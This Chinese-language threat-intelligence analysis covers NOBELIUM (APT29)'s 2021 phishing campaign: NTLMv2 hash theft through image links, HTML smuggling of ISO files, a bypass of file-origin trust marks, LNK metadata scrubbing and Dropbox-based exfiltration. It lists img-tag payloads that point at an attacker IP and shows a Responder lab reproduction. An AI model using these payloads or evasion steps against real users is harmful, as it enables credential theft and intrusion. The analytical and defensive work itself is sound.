## 情报背景

SolarWinds供应链攻击事件在去年年底引起轩然大波，各安全厂商针对事件的供应链攻击阶段和后供应链攻击阶段进行了持续的技战术分析，并不断尝试对事件幕后的攻击者进行溯源与追踪分析。微软将SolarWinds事件的始作俑者命名为“NOBELIUM”，并对其进行长期的追踪与分析（https://aka.ms/nobelium）。

而近期微软再次捕获到了NOBELIUM组织的一系列邮件钓鱼攻击活动并发布了分析报告，对其攻击链和样本进行了深入分析。同时，除微软外的其他安全厂商也对该攻击活动进行了补充分析。本文将基于已有情报，对NOBELIUM组织的本次钓鱼邮件攻击所涉及的高水平攻击思路与技术进行分析还原。

 **组织名称**

|

NOBELIUM  
  
---|---  
  
 **组织编号**

|

APT29  
  
 **关联组织**

|

UNC2452，Dark Halo，The Dukes  
  
 **相关工具**

|

EnvyScout、BoomBox、NativeZone、VaporRage、Cobalt Strike  
  
 **战术标签**

|

初始访问 执行 持久化 防御规避 发现 横向移动 收集 命令与控制 数据回传  
  
 **技术标签**

|

间接命令执行、LOLBAS、HTML Smuggling、云存储  
  
 **情报来源**

|

https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/

https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/

https://www.volexity.com/blog/2021/05/27/suspected-apt29-operation-launches-election-fraud-themed-phishing-campaigns/  
  
## 攻击技术分析

![1628240097_610cf8e128f2317cfc044.png!small?1628240097347](https://image.3001.net/images/20210806/1628240097_610cf8e128f2317cfc044.png!small?1628240097347)

### 亮点一：利用html图片外链实现NTLMv2 Hash窃取与访问探针

钓鱼邮件中的html附件包含了两条img标签外链，均会导致用户浏览器在尝试加载链接图片时去请求攻击者服务器。一方面，来自受害者客户端的网络请求可作为钓鱼探针，获取受害者IP、Useragent这类基础信息。另一方面使用外链进行网络请求可完成凭证窃取。

![1628240113_610cf8f13ff33a1dea96b.png!small?1628240113419](https://image.3001.net/images/20210806/1628240113_610cf8f13ff33a1dea96b.png!small?1628240113419)

当用户浏览器试图加载以"file://"协议访问外部资源时，主机会尝试与服务器建立smb连接，并发送NTLMv2哈希到服务端进行认证。若服务端部署诸如Responder这样的恶意攻击工具便可以捕获到请求的NTLMv2哈希，之后就可利用john等工具对哈希进行暴力破解得到目标客户端用户的密码。与Microsoft报告中所认为http协议请求的部分仅用于探针访问的观点不同，http认证请求时同样可以导致NTLMv2哈希的泄露。

 **协议**

|

 **嵌入方式**  
  
---|---  
  
file协议（smb协议）

|

<img src=file://<dst_ip>/1.jpg>  
  
http协议

|

<img src=http://<dst_ip>/1.jpg>  
  
unc路径（smb协议）

|

<img src=\\\<dst_ip>\1.jpg>  
  
省略协议头（与网站本身协议保持一致）

|

<img src=//<dst_ip>/1.jpg>  
  
 **攻击复现**

在linux系统中安装最新版Responder并启动监听。

![1628240146_610cf912a2881062ca0e5.png!small?1628240146922](https://image.3001.net/images/20210806/1628240146_610cf912a2881062ca0e5.png!small?1628240146922)

在另一台Windows机器中构造类似的html文件，嵌入访问外部图片资源的链接。

![1628240169_610cf929cb3fc7f86db99.png!small?1628240170374](https://image.3001.net/images/20210806/1628240169_610cf929cb3fc7f86db99.png!small?1628240170374)

通过smb协议抓取到的NTLMv2-SSP哈希。

![1628240184_610cf9389bbfde07b5c0a.png!small?1628240185074](https://image.3001.net/images/20210806/1628240184_610cf9389bbfde07b5c0a.png!small?1628240185074)

通过http协议抓取到的NTLMv2哈希。

![1628240386_610cfa026d3b0e68ab315.png!small?1628240386644](https://image.3001.net/images/20210806/1628240386_610cfa026d3b0e68ab315.png!small?1628240386644)

 **利用本地网页身份绕过浏览器安全限制**

因为file协议在今天的站点中已经较少被用到，Chrome、Firefox与IE7之后版本的浏览器为了保证安全性会在以http协议访问的站点中禁止使用file协议请求外部服务器资源，这也是NOBELIUM选择使用html钓鱼附件插入图片外链的原因。

![1628240402_610cfa12c673f1e6fd5fc.png!small?1628240402935](https://image.3001.net/images/20210806/1628240402_610cfa12c673f1e6fd5fc.png!small?1628240402935)

###  **亮点二：本地Html Smuggling投递恶意ISO文件**

Html
Smuggling指攻击者构造恶意的html5与javascript脚本，受害者使用浏览器访问HTML时会加载运行脚本代码并动态生成恶意文件投递到目标磁盘的行为。因文件完全在防火墙之后的客户端生成，无文件投递流量产生而完美规避了防火墙、全流量设备和沙箱的检测与阻断。NOBELIUM在本次行动中使用了FileSaver开源项目生成Html
Smuggling攻击代码并置于邮件HTML附件中。当受害者在浏览器中打开该HTML文件时会看到伪装的文件下载页面，该页面动态生成并自动下载恶意的iso文件，以网站文字内容诱导用户打开。

![1628240458_610cfa4aef855b97acf0d.png!small?1628240459156](https://image.3001.net/images/20210806/1628240458_610cfa4aef855b97acf0d.png!small?1628240459156)

NOBELIUM在构造Hmtl
smuggling代码时，加入了执行环境的检测，利用js获取当前路径，仅当网页路径在C盘才会启动iso的生成与下载，这可能是为了对抗沙箱分析所采取的一种措施。

![1628240481_610cfa61651c8937bd599.png!small?1628240482440](https://image.3001.net/images/20210806/1628240481_610cfa61651c8937bd599.png!small?1628240482440)

在最新版本的HTML样本中利用UserAgent对网页打开的浏览器环境进行了更多检测，若检测到HTML附件被手机浏览器打开时则跳转到攻击者指定的其他网站，若非Windows系统终端打开时则不进行下一步的ISO文件下载。这既避免了文件在其他操作系统上被下载而导致暴露的可能性，又可通过将受害者引导至新的站点来针对性地进行攻击。

![1628240497_610cfa71ed9536f59b992.png!small?1628240498318](https://image.3001.net/images/20210806/1628240497_610cfa71ed9536f59b992.png!small?1628240498318)

### 亮点三：利用ISO文件作为载体，突破文件来源信任控制

对于从互联网下载的文件，Windows操作系统会在名为"Zone.Identifier"的NTFS备用数据流(ADS)中进行标记，被标记的文件在默认会受到一些安全策略的限制，例如在Office中打开从互联网侧下载的doc文档时会默认以只读视图打开并警告，SMART
Screeen筛选器也会对标记为来自互联网的未知可执行文件采取阻止执行策略。

![1628240516_610cfa84e43595aee6908.png!small?1628240517099](https://image.3001.net/images/20210806/1628240516_610cfa84e43595aee6908.png!small?1628240517099)

为了避免被这种信任控制机制所限制，NOBELIUM采用了ISO镜像这种容器类文件进行投递。因为即便容器文件本身被打上标签，在被挂载后其中的文件也不会继承这种标记，而是被操作系统视作为本地文件。

另外在Win10等较新版本的操作系统中，iso文件被用户点击后将被自动挂载，并在新窗口中打开，隐藏文件等属性可以被完整的保留。NOBELIUM仅将恶意链接NV.lnk保持可见，而隐藏其他恶意内容，从而诱导用户点击最终的LNK文件。

![1628240531_610cfa93f092726b35dc2.png!small?1628240532146](https://image.3001.net/images/20210806/1628240531_610cfa93f092726b35dc2.png!small?1628240532146)

### 亮点四：反溯源分析，清理lnk文件metadata

虽然LNK文件在邮件钓鱼中应用广泛，但是其自身带有的敏感元数据却可能成为溯源方的切入点，未经修改的lnk文件包含以下信息：

创建、修改、访问时间戳

磁盘序列号

磁盘名称

主机NetBIOS名称

主机Mac地址

使用来自Mitec公司的Windows File Analyzer等工具可从lnk文件中提取这些敏感信息以用于溯源追踪分析。

![1628240552_610cfaa8891965edc5754.png!small?1628240552681](https://image.3001.net/images/20210806/1628240552_610cfaa8891965edc5754.png!small?1628240552681)

从文件结构的角度看，除时间戳信息保存在ShellLinkHeader段外，主机名等其他的敏感信息大多位于TrackerDataBlock结构部分。

![1628240573_610cfabd25e74a451d968.png!small?1628240573585](https://image.3001.net/images/20210806/1628240573_610cfabd25e74a451d968.png!small?1628240573585)

本次攻击行动中NOBELIUM对构造的lnk文件metadata进行了抹除，有效避免了敏感信息泄露导致被溯源的风险。如下图所示ShellLinkHeader结构中，记录时间戳的部分已被抹除。

![1628240587_610cfacb32252fed87576.png!small?1628240587665](https://image.3001.net/images/20210806/1628240587_610cfacb32252fed87576.png!small?1628240587665)

ExtraData段的TrackerDataBlock也做了同样的处理。

![1628240605_610cfadd6836dd58bdddb.png!small?1628240606465](https://image.3001.net/images/20210806/1628240605_610cfadd6836dd58bdddb.png!small?1628240606465)

经过处理的lnk文件中也已不再包含敏感信息。

![1628240625_610cfaf177dc6aadeb30a.png!small?1628240625611](https://image.3001.net/images/20210806/1628240625_610cfaf177dc6aadeb30a.png!small?1628240625611)

### 亮点五：精心构造的数据回传与上线过程

![1628241759_610cff5f72f05f866d7c1.png!small?1628241759791](https://image.3001.net/images/20210806/1628241759_610cff5f72f05f866d7c1.png!small?1628241759791)

当用户点击打开LNK文件后，会执行rundll32启动Boom.exe下载器。启动后首先会打开ISO中正常的pdf文件，增强钓鱼附件的可信度。

![1628241779_610cff733da647c802b3b.png!small?1628241780638](https://image.3001.net/images/20210806/1628241779_610cff733da647c802b3b.png!small?1628241780638)

Boom.exe还会在后台.完成对目标主机的信息收集 ，包括通过LDAP协议获取所有域内用户信息。

![1628241796_610cff849c3c065a4f4fb.png!small?1628241796905](https://image.3001.net/images/20210806/1628241796_610cff849c3c065a4f4fb.png!small?1628241796905)

之后Boom.exe会将收集到的信息进行加密并添加与合法PDF一致的文件头与文件尾伪装为pdf文件。

![1628241817_610cff99a1a667c145664.png!small?1628241817897](https://image.3001.net/images/20210806/1628241817_610cff99a1a667c145664.png!small?1628241817897)

最终利用web
api将伪造的pdf文件上传至NOBELIUM控制的DropBox网盘中，并从网盘拉取两个类似结构的pdf文件，再在本地进行解密，得到NativeCacheSvc.dll与CertPKIProvider.dll两个文件。通过伪装PDF文件的方式尽可能的规避了在信息回传阶段被流量审计的风险。

![1628241837_610cffadb4506f054c7b6.png!small?1628241838187](https://image.3001.net/images/20210806/1628241837_610cffadb4506f054c7b6.png!small?1628241838187)

CertPKIProvider.dll在被加载执行之后会向受NOBELIUM控制的WordPress站点发起请求，将受害者用户名等信息回传并将受控主机标识为攻陷状态。

![1628241881_610cffd9e016a1b9dce3b.png!small?1628241882117](https://image.3001.net/images/20210806/1628241881_610cffd9e016a1b9dce3b.png!small?1628241882117)

当NOBELIUM有意图对目标机器进行进一步的攻击时，则可在GET请求响应包中添加异或加密的shellcode，并由CertPKIProvider.dll在本地解密执行。

![1628241897_610cffe992b4d0b3d20c0.png!small?1628241897799](https://image.3001.net/images/20210806/1628241897_610cffe992b4d0b3d20c0.png!small?1628241897799)

当NOBELIUM有意图对目标机器进行进一步的攻击时，则可在GET请求响应包中添加异或加密的shellcode，并由CertPKIProvider.dll在本地解密执行。

## 总结

1 信息收集与命令控制并重，各阶段完成必要的信息收集后再采取进一步行动。

2 利用容器文件绕过主机对互联网文件的标记，突破信任控制体系。

3 伪造为合法文件进行数据回传，规避流量监测。

4 用于回传流量与命令控制的攻击基础设施使用了被攻陷的合法网站，并仿照其业务特征进行通讯。

